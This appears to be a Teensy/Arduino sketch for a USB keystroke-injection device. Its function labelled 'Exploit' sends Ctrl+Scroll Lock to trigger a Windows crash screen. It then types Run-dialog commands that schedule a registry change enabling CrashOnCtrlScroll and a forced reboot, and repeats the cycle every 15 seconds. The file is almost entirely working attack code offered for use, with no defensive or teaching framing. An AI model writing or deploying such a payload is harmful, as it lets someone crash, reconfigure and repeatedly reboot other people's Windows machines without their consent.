int ledPin = 11;

void setup(){}

void loop(){
  // Start
  delay(1000);
  digitalWrite(ledPin, HIGH);

  // Exploit
  WindowsPayload();

  // End
  digitalWrite(ledPin, LOW);
  delay(15000); // Long delay between runs
}

void WindowsPayload(){
  //http://support.microsoft.com/kb/Q244139
  
  // Execute BSOD command
  Keyboard.set_modifier(MODIFIERKEY_CTRL);
  Keyboard.set_key1(KEY_SCROLL_LOCK);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_SCROLL_LOCK);
  Keyboard.send_now();
 
  // Reset keys
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.set_key2(0);
  Keyboard.send_now();

  // Modify registry
  WindowsCommandRun("at 9:30 reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\i8042prt\Parameters /v CrashOnCtrlScroll /t REG_DWORD /d 1 /f");
  WindowsCommandRun("at 9:32 shutdown -r");
}

// Utility functions
void WindowsCommandRun(char *SomeCommand){
  KeyCombo(MODIFIERKEY_GUI,KEY_R);
  delay(1500);
  Keyboard.print(SomeCommand);
  KeyPress(KEY_ENTER);
}

void KeyPress(int SomeKey) {
  Keyboard.set_key1(SomeKey);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

void KeyCombo(int ModKey,int SomeKey) {
  Keyboard.set_modifier(ModKey);
  Keyboard.set_key1(SomeKey);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

